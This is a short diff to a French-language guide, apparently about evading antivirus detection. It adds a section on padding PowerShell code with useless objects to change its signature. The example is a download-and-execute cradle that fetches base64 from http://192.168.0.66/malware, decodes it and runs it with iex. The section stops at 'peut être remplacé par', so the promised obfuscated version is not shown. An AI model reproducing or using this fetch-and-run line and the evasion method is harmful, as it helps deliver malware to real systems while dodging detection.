@@ -154,7 +154,17 @@ function runToInfinity {
 ```
 
 
-## __
+## __Ajouter des objets aléatoire__
+
+On peut polluer notre code en rajoutant des objets inutiles pour changer la signature, par exemple :
+
+```powershell
+$b64 = $(irm -uri http://192.168.0.66/malware); 
+$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));
+iex $virus;
+```
+
+peut être remplacé par
 
 
 ## __Scripts__
